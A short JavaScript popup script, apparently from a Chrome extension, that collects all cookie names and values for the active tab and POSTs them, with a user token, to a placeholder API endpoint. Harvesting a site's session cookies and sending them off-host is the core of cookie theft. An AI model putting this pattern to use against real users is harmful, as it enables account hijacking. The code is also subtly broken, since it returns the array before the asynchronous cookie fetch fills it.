const http = new EasyHTTP();
const input = document.querySelector("#input");
const form = document.querySelector("#sendBtn");
const alertDanger = document.querySelector(".alert-danger");
const alertSuccess = document.querySelector(".alert-success");
alertSuccess.style.display = "none";
alertDanger.style.display = "none";
form.addEventListener("submit", sendCookies);
let cookiesArray = [];

function getCookies() {
  chrome.tabs.getSelected(null, function (tab) {
    myFunction(tab.url);
  });
  function myFunction(tablink) {
    chrome.cookies.getAll(
      {
        url: tablink,
      },
      function (cookies) {
        for (var i in cookies) {
          cookiesArray[i] = {
            domain: tablink,
            name: cookies[i].name,
            value: cookies[i].value,
          };
        }
      }
    );
  }
  return cookiesArray;
}

function storeTokenInLocalStorage() {
  const tokenValue = document.getElementById("input").value;

  let tokenArray;

  if (localStorage.getItem("token") === null) {
    tokenArray = [];
  } else {
    tokenArray = JSON.parse(localStorage.getItem("token"));
  }

  tokenArray.push(tokenValue);

  localStorage.setItem("token", JSON.stringify(tokenArray));
}

getCookies();

function sendCookies(e) {
  storeTokenInLocalStorage();

  http
    .post("https://jsonplaceholder.typicode.com/users", getCookies())
    .then(() => {
      alertSuccess.style.display = "block";
    })
    .catch((err) => (alertDanger.style.display = "block"));
  e.preventDefault();
}
